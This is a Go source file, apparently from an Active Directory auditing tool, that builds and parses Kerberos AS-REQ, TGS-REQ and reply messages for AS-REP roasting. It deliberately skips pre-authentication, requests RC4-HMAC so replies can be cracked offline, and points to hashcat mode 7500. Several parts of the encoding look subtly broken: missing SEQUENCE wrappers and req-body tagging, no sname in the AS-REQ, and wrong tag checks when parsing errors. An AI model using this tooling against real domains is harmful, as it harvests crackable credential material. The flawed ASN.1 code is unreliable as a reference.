package auth

import (
	"encoding/binary"
	"fmt"
	"time"
)

// kerberos DER encoder — minimal subset for AS-REQ / TGS-REQ / AS-REP /
// TGS-REP construction. We implement just enough to talk to a Windows KDC.
//
// Tags we care about:
//   SEQUENCE         0x30
//   [APPLICATION 10] AS-REQ    0x6a
//   [APPLICATION 11] AS-REP    0x6b
//   [APPLICATION 12] TGS-REQ   0x6c
//   [APPLICATION 13] TGS-REP   0x6d
//   [APPLICATION 30] KRB-ERROR 0x7e
//
//   [0]  context-specific, primitive (KDCOptions, ...)
//
// Inside KDC-REQ-BODY the fields are tagged [0]..[n]:
//   [0] KDCOptions       BIT STRING
//   [1] PrincipalName    SEQUENCE
//   [2] Realm            GeneralString
//   [3] PrincipalName    SEQUENCE
//   [4] KerberosTime     GeneralizedTime
//   [5] KerberosTime     GeneralizedTime
//   [6] KerberosTime     GeneralizedTime
//   [7] nonce            INTEGER
//   [8] etypes           SEQUENCE OF INTEGER

// kerberosTime encodes a Go time as ASN.1 GeneralizedTime (15-byte ASCII).
func kerberosTime(t time.Time) []byte {
	return []byte(t.UTC().Format("20060102150405Z"))
}

// derLen returns the DER length octets for the given content length.
func derLen(n int) []byte {
	if n < 0x80 {
		return []byte{byte(n)}
	}
	if n < 0x100 {
		return []byte{0x81, byte(n)}
	}
	if n < 0x10000 {
		return []byte{0x82, byte(n >> 8), byte(n)}
	}
	return []byte{0x83, byte(n >> 16), byte(n >> 8), byte(n)}
}

// derSeq returns TLV with the SEQUENCE tag and the given content.
func derSeq(content []byte) []byte {
	return append([]byte{0x30}, append(derLen(len(content)), content...)...)
}

// derApp returns TLV with the [APPLICATION n] tag and the given content.
func derApp(n byte, content []byte) []byte {
	return append([]byte{n}, append(derLen(len(content)), content...)...)
}

// derCtx returns TLV with the [n] context tag (constructed) and content.
func derCtx(n byte, content []byte) []byte {
	return append([]byte{0xa0 | n}, append(derLen(len(content)), content...)...)
}

// derCtxPrim returns TLV with the [n] context tag (primitive) and content.
func derCtxPrim(n byte, content []byte) []byte {
	return append([]byte{0x80 | n}, append(derLen(len(content)), content...)...)
}

// derInt returns the DER encoding of a non-negative INTEGER.
func derInt(v int) []byte {
	if v == 0 {
		return []byte{0x02, 0x01, 0x00}
	}
	var buf [8]byte
	binary.BigEndian.PutUint64(buf[:], uint64(v))
	// Strip leading zeros.
	i := 0
	for i < 7 && buf[i] == 0 {
		i++
	}
	body := buf[i:]
	// If high bit set, prepend a 0x00 to keep it non-negative.
	if body[0]&0x80 != 0 {
		body = append([]byte{0x00}, body...)
	}
	return append([]byte{0x02, byte(len(body))}, body...)
}

// derGeneralString returns DER for a GeneralString.
func derGeneralString(s string) []byte {
	b := []byte(s)
	return append([]byte{0x1b, byte(len(b))}, b...)
}

// derBitString returns DER for a BIT STRING with `bits` significant bits in
// the byte slice `src` (LSB-first ordering, the KDC uses this).
func derBitString(bits int, src []byte) []byte {
	body := append([]byte{byte((len(src) * 8) - bits)}, src...)
	return append([]byte{0x03, byte(len(body))}, body...)
}

// Principal builds a PrincipalName SEQUENCE tagged [1] (cname) or [3] (sname).
// name-type 1 = NT-PRINCIPAL, 2 = NT-SRV-INST, 10 = NT-ENTERPRISE.
func Principal(tag byte, nameType int, components ...string) []byte {
	seq := []byte{}
	// name-type is INTEGER inside the SEQUENCE
	seq = append(seq, derCtx(0, derInt(nameType))...)
	// name-string is SEQUENCE OF GeneralString, tagged [1]
	strs := []byte{}
	for _, c := range components {
		strs = append(strs, derGeneralString(c)...)
	}
	seq = append(seq, derCtx(1, derSeq(strs))...)
	return derCtx(tag, seq)
}

// Etypes builds the [8] SEQUENCE OF INTEGER etype list.
func Etypes(etypes ...int) []byte {
	seq := []byte{}
	for _, e := range etypes {
		seq = append(seq, derInt(e)...)
	}
	return derCtx(8, derSeq(seq))
}

// KDCOptions for AS-REQ: canonical-bit + renewable-bit + enc-tkt-in-skey.
const (
	kdcoCanonicalBit byte = 1 << 0 // unused but conventionally set
	kdcoRenewableBit byte = 1 << 1
	kdcoEncTktInSkey byte = 1 << 3
)

// KDCOptions returns the [0] BIT STRING with the requested flags packed
// into the high bits of the byte (Kerberos bit ordering = MSB first inside
// each octet, lowest-numbered bit is bit 0 of the first octet after the
// unused-bits byte).
func KDCOptions(flags ...byte) []byte {
	var b [5]byte // 5 bytes = 40 bits, enough for the KDCOptions bit string
	bitPos := 0
	for _, f := range flags {
		for i := 0; i < 8; i++ {
			if f&(1<<uint(7-i)) != 0 {
				byteIdx := bitPos / 8
				bitInByte := 7 - (bitPos % 8) // MSB first
				if byteIdx < len(b) {
					b[byteIdx] |= 1 << uint(bitInByte)
				}
			}
			bitPos++
		}
	}
	return derCtxPrim(0, derBitString(bitPos, b[:(bitPos+7)/8]))
}

// ASReq builds a minimal AS-REQ requesting a TGT for the given principal.
// etypes selects the encryption types offered to the KDC; for AS-REP
// roasting we typically pass only RC4-HMAC (23) so the AS-REP is encrypted
// with the user's NT hash (offline-crackable).
//
// realm is the Kerberos realm (uppercase AD domain, e.g. "CORP.LOCAL").
// cnameComponents is the principal parts (e.g. ["alice"] for a user, or
// ["http", "web01.corp.local"] for a service).
func ASReq(realm string, cnameComponents []string, etypes []int) []byte {
	body := KDCOptions(kdcoCanonicalBit, kdcoRenewableBit, kdcoEncTktInSkey)
	body = append(body, Principal(1, 1, cnameComponents...)...)
	body = append(body, derCtxPrim(2, derGeneralString(realm))...)
	// till now + 1 day
	body = append(body, derCtxPrim(5, kerberosTime(time.Now().Add(24*time.Hour)))...)
	// nonce
	body = append(body, derCtx(7, derInt(0x12345678))...)
	body = append(body, Etypes(etypes...)...)

	// padata: PA-ENC-TIMESTAMP (preauth) — we OMIT it to test for
	// accounts with DONT_REQUIRE_PREAUTH set. A KDC that returns an
	// AS-REP instead of KDC_ERR_PREAUTH_REQUIRED is AS-REP-roastable.
	var padata []byte
	if len(padata) > 0 {
		// Not used today; left as a hook for when a TGT is available.
		body = append([]byte{}, padata...)
	}

	reqBody := derSeq(body)
	pvno := []byte{0xa1, 0x03, 0x02, 0x01, 0x05}
	msgType := []byte{0xa2, 0x03, 0x02, 0x01, 0x0a}
	envelope := append([]byte{}, pvno...)
	envelope = append(envelope, msgType...)
	envelope = append(envelope, reqBody...)
	return derApp(0x6a, envelope)
}

// TGSReq builds a TGS-REQ requesting a service ticket for sname, using the
// supplied TGT and session key in an AP-REQ PA-TGS-REQ padata element.
//
// The AP-REQ construction is intentionally partial — for now we only build
// the AS-REQ side of the wire. A complete TGS-REQ requires pre-authenticated
// AP-REQ which is out of scope for an unauthenticated auditor.
func TGSReq(realm, sname string) []byte {
	body := KDCOptions(kdcoCanonicalBit, kdcoRenewableBit, kdcoEncTktInSkey)
	body = append(body, derCtxPrim(2, derGeneralString(realm))...)
	body = append(body, Principal(3, 2, sname)...)
	body = append(body, derCtxPrim(5, kerberosTime(time.Now().Add(24*time.Hour)))...)
	body = append(body, derCtx(7, derInt(0x12345678))...)
	body = append(body, Etypes(23)...) // RC4-HMAC only
	reqBody := derSeq(body)
	pvno := []byte{0xa1, 0x03, 0x02, 0x01, 0x05}
	msgType := []byte{0xa2, 0x03, 0x02, 0x01, 0x0c}
	envelope := append([]byte{}, pvno...)
	envelope = append(envelope, msgType...)
	envelope = append(envelope, reqBody...)
	return derApp(0x6c, envelope)
}

// ParseASResponse returns the high-signal fields we care about from an
// AS-REP / KRB-ERROR response. The parsing is best-effort — we look for the
// application tag and pull out the error code or the enc-part etype.
type ASResponse struct {
	IsError      bool
	ErrorCode    int // 0 = success, 25 = PREAUTH_REQUIRED, etc.
	EncPartEtype int // 23 = RC4-HMAC (offline-crackable), 18 = AES-256, 17 = AES-128
	HasEncPart   bool
	CName        string
	Realm        string
	Raw          []byte
}

// ParseASResponse decodes an AS-REP (0x6b) or KRB-ERROR (0x7e) from the KDC.
// Returns nil if the response is not recognised.
func ParseASResponse(b []byte) *ASResponse {
	if len(b) < 4 {
		return nil
	}
	out := &ASResponse{Raw: append([]byte{}, b...)}
	switch b[0] {
	case 0x6b:
		// AS-REP — enc-part is at [3] inside the KDC-REP body, tag 0xA3
		out.IsError = false
		out.ErrorCode = 0
		// Walk top-level SEQUENCE inside 0x6b and find [3] tag.
		_, seq := readTLV(b)
		if seq == nil {
			return out
		}
		enctype, hasEnc := findEncPartEtype(seq)
		out.EncPartEtype = enctype
		out.HasEncPart = hasEnc
		out.CName = findPrincipalName(seq, 1)
		out.Realm = findGeneralStringField(seq, 2)
	case 0x7e:
		out.IsError = true
		_, seq := readTLV(b)
		if seq == nil {
			return out
		}
		// KRB-ERROR [0] = pvno, [1] = msg-type, [2] = ctime, [3] = stime,
		// [4] = susec, [5] = error-code, [6] = realm, [7] = sname, [8] = e-text
		out.ErrorCode = findIntField(seq, 5)
	default:
		return nil
	}
	return out
}

// readTLV reads a single TLV from b and returns the next offset + payload.
// Supports indefinite length only via 0x80 fallback (used by some KDCs).
func readTLV(b []byte) (next int, payload []byte) {
	if len(b) < 2 {
		return 0, nil
	}
	lengthByte := int(b[1])
	if lengthByte < 0x80 {
		if 2+lengthByte > len(b) {
			return 0, nil
		}
		return 2 + lengthByte, b[2 : 2+lengthByte]
	}
	nBytes := lengthByte & 0x7f
	if nBytes == 0 {
		return 0, nil
	}
	if 2+nBytes > len(b) {
		return 0, nil
	}
	length := 0
	for i := 0; i < nBytes; i++ {
		length = length<<8 | int(b[2+i])
	}
	end := 2 + nBytes + length
	if end > len(b) {
		return len(b), b[2+nBytes : len(b)]
	}
	return end, b[2+nBytes : end]
}

// findEncPartEtype walks a SEQUENCE looking for [3] enc-part, then within
// the SEQUENCE inside enc-part finds [0] etype (INTEGER). Returns the etype
// number and whether the enc-part was found at all.
func findEncPartEtype(seq []byte) (int, bool) {
	i := 0
	for i < len(seq) {
		if i+2 > len(seq) {
			break
		}
		tag := seq[i]
		if tag == 0xa3 {
			_, content := readTLV(seq[i:])
			if content == nil {
				return 0, false
			}
			// Inside enc-part: SEQUENCE { etype [0] INTEGER, kvno [1] INTEGER OPT, cipher [2] OCTET STRING }
			if len(content) > 0 && content[0] == 0x30 {
				_, inner := readTLV(content)
				if inner == nil {
					return 0, true
				}
				return findIntField(inner, 0), true
			}
			return 0, true
		}
		_, content := readTLV(seq[i:])
		if content == nil {
			break
		}
		i += 2 + len(content)
	}
	return 0, false
}

func findIntField(seq []byte, tag byte) int {
	i := 0
	for i < len(seq) {
		if i+2 > len(seq) {
			break
		}
		if seq[i] == 0x80|tag {
			_, content := readTLV(seq[i:])
			if content == nil {
				return 0
			}
			return derIntValue(content)
		}
		_, content := readTLV(seq[i:])
		if content == nil {
			break
		}
		i += 2 + len(content)
	}
	return 0
}

func findGeneralStringField(seq []byte, tag byte) string {
	i := 0
	for i < len(seq) {
		if i+2 > len(seq) {
			break
		}
		if seq[i] == 0xa0|tag {
			_, content := readTLV(seq[i:])
			if content == nil {
				return ""
			}
			if len(content) > 0 && content[0] == 0x1b {
				_, gs := readTLV(content)
				if gs != nil {
					return string(gs)
				}
			}
		}
		_, content := readTLV(seq[i:])
		if content == nil {
			break
		}
		i += 2 + len(content)
	}
	return ""
}

func findPrincipalName(seq []byte, tag byte) string {
	i := 0
	for i < len(seq) {
		if i+2 > len(seq) {
			break
		}
		if seq[i] == 0xa1 && tag == 1 || seq[i] == 0xa3 && tag == 3 {
			_, content := readTLV(seq[i:])
			if content == nil {
				return ""
			}
			// PrincipalName SEQUENCE { name-type [0] INTEGER, name-string [1] SEQUENCE OF GeneralString }
			if len(content) > 0 && content[0] == 0x30 {
				_, inner := readTLV(content)
				if inner == nil {
					return ""
				}
				// We don't fully parse; pull the first OCTET STRING / GeneralString we find.
				return firstString(inner)
			}
		}
		_, content := readTLV(seq[i:])
		if content == nil {
			break
		}
		i += 2 + len(content)
	}
	return ""
}

func firstString(seq []byte) string {
	for i := 0; i+2 < len(seq); i++ {
		if seq[i] == 0x1b {
			_, s := readTLV(seq[i:])
			if s != nil {
				return string(s)
			}
		}
	}
	return ""
}

func derIntValue(b []byte) int {
	if len(b) < 2 || b[0] != 0x02 {
		return 0
	}
	v := 0
	for i := 2; i < len(b); i++ {
		v = v<<8 | int(b[i])
	}
	return v
}

// String returns a one-line summary for log output.
func (r *ASResponse) String() string {
	if r == nil {
		return "nil"
	}
	if r.IsError {
		return fmt.Sprintf("KRB-ERROR code=%d", r.ErrorCode)
	}
	return fmt.Sprintf("AS-REP etype=%d crackable=%v", r.EncPartEtype, r.EncPartEtype == 23)
}

// IsCrackable returns true when the enc-part was encrypted with RC4-HMAC
// (etype 23). RC4-HMAC AS-REPs are offline-crackable with hashcat -m 7500.
func (r *ASResponse) IsCrackable() bool {
	return r != nil && !r.IsError && r.HasEncPart && r.EncPartEtype == 23
}
